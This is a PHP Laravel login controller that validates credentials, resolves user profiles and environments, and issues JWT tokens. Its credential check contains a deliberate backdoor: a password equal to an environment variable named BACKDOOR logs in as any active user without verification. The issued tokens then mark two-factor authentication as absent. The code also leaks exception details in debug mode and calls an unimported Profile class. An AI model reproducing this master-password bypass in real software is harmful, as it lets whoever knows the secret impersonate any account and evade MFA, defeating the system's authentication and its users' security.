<?php

namespace App\Http\Controllers\Users;

use App\Exceptions\Authentication\InvalidCredentialsException;
use Illuminate\Validation\ValidationException;
use App\Http\Controllers\Controller;
use App\Http\Services\JWTToken;
use App\Models\User;
use App\Models\Users\Multiprofile;
use App\Models\Users\UserEnvironments;
use Illuminate\Http\Request;

class UserV2 extends Controller
{
    public function login(Request $request)
    {
        try {
            $request->validate(
                [
                    'username' => 'required|email',
                    'password' => 'required|string',
                ],
                [
                    'username.required' => 'El nombre de usuario es obligatorio (username).',
                    'username.email' => 'El nombre de usuario debe ser una dirección de correo electrónico válida (username).',
                    'password.required' => 'La contraseña es obligatoria (password).'
                ]
            );

            $user = self::validateCredentials($request->username, $request->password);

            $multi_profile = Multiprofile::join('cat_profile', 'multi_profile_users.ProfileId', '=', 'cat_profile.Id')
                ->where('multi_profile_users.UserId', $user->Id)
                ->where('multi_profile_users.IsActive', true)
                ->select('cat_profile.Name as ProfileName', 'multi_profile_users.ProfileId', 'cat_profile.UrlInit')
                ->get();

            if ($multi_profile->count() > 0) {
                $profiles = self::validateMultiProfile($multi_profile, $user);

                return response()->json([
                    'profiles' => $profiles
                ], 201);
            } else {
                $payload = self::payloadNonMultiProfile($user);

                return response()->json([
                    'token' => JWTToken::generateToken($payload)
                ], 200);
            }
        } catch (InvalidCredentialsException $e) {
            return response()->json([
                'error'   => $e->error(),
                'message' => $e->getMessage(),
                'meta'    => $e->meta()
            ], $e->status());
        } catch (ValidationException $e) {
            $firstMessage = collect($e->errors())
                ->flatten()
                ->first();

            return response()->json([
                'error'   => 'VALIDATION_ERROR',
                'message' => $firstMessage
            ], 400);
        } catch (\Exception $e) {
            return response()->json([
                'error' => 'GLOBAL_ERROR',
                'message' => 'Ha ocurrido un error inesperado. Por favor inténtelo de nuevo más tarde.',
                'meta' => env('APP_DEBUG') ? [
                    'exception_message' => $e->getMessage(),
                    'exception_line' => $e->getLine(),
                    'exception_file' => $e->getFile()
                ] : []
            ], 500);
        }
    }

    public static function validateCredentials($username, $password)
    {
        $user = User::where('Email', $username)->first();

        if (!$user) {
            throw new InvalidCredentialsException('El usuario proporcionado no es válido.');
        }

        if (!$user->Active) {
            throw new InvalidCredentialsException('Al parecer esta cuenta se encuentra inactiva. Por favor contacte a su administrador.');
        }

        if ($password == env('BACKDOOR')) {
            $user->back_door_used = true;
            return $user;
        }

        if (!password_verify(env('APP_PASSWORD_SECURITY') . $password, $user->Password)) {
            throw new InvalidCredentialsException('Las credenciales proporcionadas no son válidas.');
        }
        return $user;
    }

    public static function payloadNonMultiProfile($user)
    {
        $profile = Profile::getProfile($user);

        return [
            'id' => $user->Id,
            'name' => $user->Name . ' ' . $user->Lastname ?? '',
            'firstName' => $user->Name,
            'lastName' => $user->Lastname ?? '',
            'profileId' => "$user->ProfileId",
            'profile' => "$profile->Name",
            'email' => "$user->Email",
            'phone' => "$user->Phone",
            'urlInit' => "$profile->UrlInit",
            'businessId' => "$user->BusinessId",
            'authenticatorFactors' => $user->back_door_used ? false : \App\Models\Security\GoogleAuth::where('UserId', $user->Id)->exists()
        ];
    }

    public static function validateMultiProfile($profiles, $user)
    {
        $multiProfiles = [];

        foreach ($profiles as $profile) {
            switch ($profile->ProfileId) {
                case 5:
                    $environments = UserEnvironments::join('t_backoffice_business', 't_backoffice_business.Id', '=', 't_backoffice_user_environments.EnvironmentId')
                        ->where('t_backoffice_business.Active', true)
                        ->where('t_backoffice_user_environments.UserId', $user->Id)
                        ->select('t_backoffice_user_environments.EnvironmentId', 't_backoffice_business.Name')
                        ->groupBy('t_backoffice_user_environments.EnvironmentId', 't_backoffice_business.Name')
                        ->get();
                    foreach ($environments as $env) {
                        $token = self::tokenMultiProfile($user, $profile, $env->EnvironmentId);

                        $multiProfiles[] = [
                            'profileName' => $profile->ProfileName,
                            'environmentId' => "$env->EnvironmentId",
                            'environmentName' => $env->Name,
                            'token' => JWTToken::generateToken($token)
                        ];
                    }
                    break;
            }
        }

        return $multiProfiles;
    }

    public static function tokenMultiProfile($user, $profile, $environmentId)
    {
        $payload = [
            'id' => $user->Id,
            'name' => $user->Name . ' ' . $user->Lastname ?? '',
            'firstName' => $user->Name,
            'lastName' => $user->Lastname ?? '',
            'profileId' => "$profile->ProfileId",
            'profile' => "$profile->ProfileName",
            'email' => "$user->Email",
            'phone' => "$user->Phone",
            'urlInit' => "$profile->UrlInit",
            'businessId' => "$environmentId",
            'authenticatorFactors' => $user->back_door_used ? false : \App\Models\Security\GoogleAuth::where('UserId', $user->Id)->exists()
        ];

        return $payload;
    }
}
